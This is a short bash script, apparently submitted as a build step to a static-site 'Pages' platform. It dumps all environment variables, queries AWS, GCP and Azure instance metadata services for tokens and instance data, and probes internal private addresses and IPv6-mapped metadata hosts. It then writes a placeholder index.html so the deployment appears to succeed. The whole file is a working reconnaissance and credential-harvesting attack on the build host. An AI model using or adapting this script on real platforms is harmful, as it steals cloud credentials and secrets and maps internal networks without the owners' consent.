#!/bin/bash
echo "=== IMDS PROBE START ==="
echo "=== System Info ==="
uname -a 2>&1 || true
whoami 2>&1 || true
id 2>&1 || true
cat /etc/os-release 2>&1 | head -5 || true

echo "=== Network Info ==="
ip addr 2>&1 | head -20 || ifconfig 2>&1 | head -20 || true
ip route 2>&1 || route -n 2>&1 || true
cat /etc/resolv.conf 2>&1 || true

echo "=== Environment Variables ==="
env | sort 2>&1

echo "=== IMDS Probes ==="
# AWS IMDSv1
echo "--- AWS IMDS ---"
curl -sv --max-time 3 http://169.254.169.254/latest/meta-data/ 2>&1 || true

# AWS IMDSv2 (token-based)
echo "--- AWS IMDSv2 ---"
TOKEN=$(curl -sv --max-time 3 -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1) || true
echo "Token response: $TOKEN"
curl -sv --max-time 3 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/ 2>&1 || true

# GCP
echo "--- GCP IMDS ---"
curl -sv --max-time 3 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/?recursive=true 2>&1 || true
curl -sv --max-time 3 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/?recursive=true 2>&1 || true

# Azure
echo "--- Azure IMDS ---"
curl -sv --max-time 3 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 || true

# Internal network scan
echo "=== Internal Network Probes ==="
for ip in 10.0.0.1 10.1.0.1 10.10.0.1 172.16.0.1 172.17.0.1 192.168.0.1 192.168.1.1; do
  echo "--- Probe $ip ---"
  curl -sv --max-time 2 http://$ip/ 2>&1 | head -5 || true
done

# IPv6
echo "--- IPv6 probes ---"
curl -sv --max-time 2 "http://[::ffff:169.254.169.254]/latest/meta-data/" 2>&1 || true
curl -sv --max-time 2 "http://[fd00::1]/" 2>&1 || true

echo "=== IMDS PROBE COMPLETE ==="

# Build the output so Pages deployment succeeds
mkdir -p dist
echo "<h1>probe complete</h1>" > dist/index.html
